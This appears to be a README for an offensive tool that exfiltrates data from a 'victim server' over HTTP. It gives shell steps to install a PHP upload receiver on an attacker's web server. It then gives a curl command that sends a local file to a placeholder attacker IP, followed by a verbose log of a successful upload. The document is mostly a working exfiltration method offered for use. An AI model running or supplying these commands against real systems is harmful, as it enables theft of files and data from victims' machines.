# data-exfiltration-through-an-http-tunnel

# Requirements

- Web server with php. (apache2/nginx...)

```
cd /var/www/html 
git clone https://github.com/archidote/data-exfiltration-through-an-http-tunnel
sudo chown www-data:www-data -R data-exfiltration-through-an-http-tunnel
sudo chmod 700 -R data-exfiltration-through-an-http-tunnel
```

# From the victim server : 

## curl 

```
curl -v -F filename=image.jpg -F uploaded_file=@/tmp/image.png http://{IP_OF_THE_ATTACKER_WEB_SERVER}/data-exfiltration-through-an-http-tunnel/upload.php
```

## attended HTTP Response : 

```
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80 (#0)
> POST /data-exfiltration-through-an-http-tunnel/upload.php HTTP/1.1
> Host: localhost
> User-Agent: curl/7.84.0
> Accept: */*
> Content-Length: 5519137
> Content-Type: multipart/form-data; boundary=------------------------a75aa6898e1c43c5
> Expect: 100-continue
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 09 Sep 2022 08:57:53 GMT
< Server: Apache/2.4.54 (Debian)
< Vary: Accept-Encoding
< Content-Length: 351
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
* Connection #0 to host localhost left intact
The file image.JPG has been uploaded
```